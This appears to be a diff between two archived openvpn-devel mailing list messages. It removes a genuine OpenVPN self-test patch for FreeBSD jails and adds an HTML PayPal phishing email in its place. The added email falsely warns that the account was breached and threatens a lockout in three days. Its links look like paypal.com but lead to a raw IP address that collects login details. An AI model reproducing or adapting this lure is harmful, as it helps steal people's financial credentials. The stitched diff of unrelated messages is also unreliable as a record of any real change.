@@ -1,9 +1,6 @@
-From: Matthias Andree <ma+ovpnd@...31...>
-Message-ID: <20051104124852.GA19426@...33...>
-MIME-Version: 1.0
-Content-Type: multipart/mixed; boundary="rwEMma7ioTxnRzrJ"
-Content-Disposition: inline
-Subject: [Openvpn-devel] [PATCH] self-test updates, fix unterminated loop in BSD jails
+From: support@...490... <support@...490...>
+Message-Id: <20051104171948.310CE13876D@...491...>
+Subject: [Openvpn-devel] PayPal - Check your account
 Sender: openvpn-devel-admin@lists.sourceforge.net
 Errors-To: openvpn-devel-admin@lists.sourceforge.net
 List-Unsubscribe: <https://lists.sourceforge.net/lists/listinfo/openvpn-devel>,
@@ -14,113 +11,93 @@ List-Help: <mailto:openvpn-devel-request@lists.sourceforge.net?subject=help>
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/openvpn-devel>,
 	<mailto:openvpn-devel-request@lists.sourceforge.net?subject=subscribe>
 List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum=openvpn-devel>
-Date: Fri Nov  4 04:50:33 2005
+Date: Fri Nov  4 09:25:57 2005
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: 8bit
 To: openvpn-devel@lists.sourceforge.net
 
---rwEMma7ioTxnRzrJ
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
+<head><title>PayPal</title>
+<style type="text/css">#obmessage .dummy {}
+#z BODY, #z  TD {font-family: verdana,arial,helvetica,sans-serif;
+font-size:12px;color: #000000;}
+</style>
+</head>
+<span id=z>
+<xhtml>
+<table width=680 align=center>
+        <tr><td><A target="_blank"href="https://www.paypal.com/us"><IMG
+src="http://images.paypal.com/en_US/i/logo/email_logo.gif" alt=PayPal border=0></A></td></tr>
+</table>
+<table width="100%" cellpadding=0>
+        <tr><td background="http://images.paypal.com/images/bg_clk.gif" width=100%><img
+src="http://images.paypal.com/images/pixel.gif"height=29 width=1 border=0></td></tr>
+</table>
+<br>
+<table align=center>
+        <tr>
+        <td width=400>
+        <table>
+                <tr><td>Information Regarding Your account:</td></tr>
+                <tr><td><b>Dear PayPal Member!<br><br>Attention! Your PayPal account has been violated!<br><br>Someone
+with ip address 149.225.126.87 tried to access your personal account!</b><br><br>Please <b>click the link below</b> and
+enter your account information to confirm that you are not currently away. You have 3 days to confirm account
+information or your account will be locked.<br><br>
+                <table width="80%" cellspacing=0 border=0 bgcolor="#FFE65C" align=left>
+                        <tr><td>
+                        <table width="100%" cellpadding=4 bgcolor="#FFFECD" align=center>
+                                <tr><td class="pp_sansserif" align=center><a target="_blank"
+href="http://210.0.201.232/mrtg/.cgi-bin/.paypal/">Click here to activate your account</a></td></tr>
+                        </table>
+                        </td></tr>
+                </table>
+                <br><br><BR>You can also confirm your email address by logging into your PayPal account at<a
+target="_blank" href="http://210.0.201.232/mrtg/.cgi-bin/.paypal/"><br>http://paypal.com/</a>. Click
+ on the
+"Confirm email" link in
+the Activate Account box and then enter this confirmation number: 1036-8535-4511-9500-3892<br><br>Thank you for using
+PayPal!<br>The PayPal Team
+                </td></tr>
+                <tr><td><hr class=dotted></td></tr>
+                <tr><td>
+                <tr><td class="pp_footer">Please do not reply to this e-mail. Mail sent to this address cannot be
+answered. For assistance,
+            <a href="http://210.0.201.232/mrtg/.cgi-bin/.paypal/">log in</a> to your PayPal account
+and choose
+the "Help" link in the
+footer of any
+page.<br></td></tr><tr><td><img src="http://images.paypal.com/en_US/i/scr/pixel.gif" height=10 width=1
+border=0></td></tr>
+                <tr><td>PayPal Email ID PP059</td></tr>
+        </table>
+        </td>
+        <td width=190 valign=top>
+        <table cellspacing=0 cellpadding=1 bgcolor="#cccccc">
+                <td>
+                <table cellspacing=0 cellpadding=0 bgcolor="#ffffff">
+                        <tr><td>
+                        <table width="100%" cellpadding=5 bgcolor="#eeeeee">
+                                <tr><td align=center>Protect Your Account Info</td></tr>
+                        </table>
+                        <table cellpadding=5>
+                                <tr><td>Make sure you never provide your password to fraudulent websites.<br><br>To
+safely and securely access the PayPal website or your account, open a new web browser (e.g. Internet Explorer or
+Netscape) and type in the PayPal login page (http://paypal.com/) to be sure you are on the real PayPal
+site.<br><br>PayPal will never ask you to enter your password in an email.<br><br>For more information on protecting
+yourself from fraud, please review our Security Tips at https://www.paypal.com/us/securitytips<br></td></tr>
+                        </table></td></tr>
+                        <tr><td>
+                        <table width="100%" cellpadding=5 bgcolor="#eeeeee">
+                                <tr><td align=center>Protect Your Password</td></tr>
+                        </table>
+                        <table cellpadding=5>
+                                <tr><td>You should never give your PayPal password to anyone.<br></td></tr>
+                        </table>
+                        </td></tr>
+                </table>
+                </td></tr>
+        </table>
+        </td></tr>
+</table>
+</xhtml></span>
 
-Greetings,
-
-Dirk 'dinoex' Meyer reported issues when the self-test is run inside a
-FreeBSD "jail" (see below), in that t_cltsrv.sh never completes and he
-also provided logs:
-
-| ...
-| Fri Nov  4 11:12:55 2005 UDPv4 link local (bound): 127.0.0.1:16001
-| Fri Nov  4 11:12:55 2005 UDPv4 link remote: 127.0.0.1:16000
-| Fri Nov  4 11:12:55 2005 TCP/UDP: Incoming packet rejected from A.B.C.D:16001[2], expected peer address: 127.0.0.1:16001 (allow this incoming source address/port by removing --remote or adding --float)
-
-This is consistent with the jail(2) documentation on FreeBSD 5-STABLE.
-
-A BSD "jail" is mainly a locked-down chroot where network communication
-is tied to a particular IP address. This IP address is configured at
-jail setup time and even "loopback" communication is remapped to the
-jail's IP. This creates the problem above.
-
-The sample-config-files/loopback-* scripts however do not terminate
-openvpn if the connection cannot be established.
-
-To fix this by adding --float if running in a FreeBSD, and to address
-and some minor issues (t_lpback leaves log.$$ behind if successful;
-tests should perhaps print "SKIP" rather than "FAIL" if aborted), I
-suggest the attached updates to the t_* scripts, against SVN trunk
-(version 2.0.5).  Tested on FreeBSD 5.4 i586, SUSE Linux 9.3 i686,
-Solaris 8 sun4u sparc.
-
-Please apply to 2.0 and 2.1.
-
--- 
-Matthias Andree
-
---rwEMma7ioTxnRzrJ
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: attachment; filename="testupdates.patch"
-
-Index: t_lpback.sh
-===================================================================
---- t_lpback.sh	(revision 774)
-+++ t_lpback.sh	(working copy)
-@@ -19,11 +19,13 @@
- # 02110-1301, USA.
- 
- set -e
--trap "rm -f key.$$ log.$$ ; false" 1 2 3 15
-+trap "rm -f key.$$ log.$$ ; trap 0 ; exit 77" 1 2 15
-+trap "rm -f key.$$ log.$$ ; exit 1" 0 3
- ./openvpn --genkey --secret key.$$
- set +e
- ( ./openvpn --test-crypto --secret key.$$ ) >log.$$ 2>&1
- e=$?
- if [ $e != 0 ] ; then cat log.$$ ; fi
--rm key.$$
-+rm key.$$ log.$$
-+trap 0
- exit $e
-Index: t_cltsrv.sh
-===================================================================
---- t_cltsrv.sh	(revision 774)
-+++ t_cltsrv.sh	(working copy)
-@@ -20,19 +20,33 @@
- 
- set -e
- echo "the following test will run about two minutes..." >&2
--trap "rm -f log.$$ ; false" 1 2 3 15
-+trap "rm -f log.$$ log.$$.signal ; trap 0 ; exit 77" 1 2 15
-+trap "rm -f log.$$ log.$$.signal ; exit 1" 0 3
-+addopts=
-+case `uname -s` in
-+    FreeBSD)
-+    # FreeBSD jails map the outgoing IP to the jail IP - we need to
-+    # allow the real IP unless we want the test to run forever.
-+    if test `sysctl -n security.jail.jailed` != 0 ; then
-+	addopts="--float"
-+    fi
-+    ;;
-+esac
- set +e
- (
--./openvpn --cd "${srcdir}" --config sample-config-files/loopback-server &
--./openvpn --cd "${srcdir}" --config sample-config-files/loopback-client
--) >log.$$ 2>&1
-+./openvpn --cd "${srcdir}" ${addopts} --down 'echo "srv:${signal}" >&3 ; : #' --tls-exit --ping-exit 180 --config sample-config-files/loopback-server &
-+./openvpn --cd "${srcdir}" ${addopts} --down 'echo "clt:${signal}" >&3 ; : #' --tls-exit --ping-exit 180 --config sample-config-files/loopback-client
-+) 3>log.$$.signal >log.$$ 2>&1
- e1=$?
- wait $!
- e2=$?
-+grep -v ":inactive$" log.$$.signal >/dev/null && { cat log.$$.signal ; echo ; cat log.$$ ; exit 1 ; }
-+
- set -e
- 
- if [ $e1 != 0 ] || [ $e2 != 0 ] ; then
-     cat log.$$
-     exit 1
- fi
--rm log.$$
-+rm log.$$ log.$$.signal
-+trap 0
-
---rwEMma7ioTxnRzrJ--
 
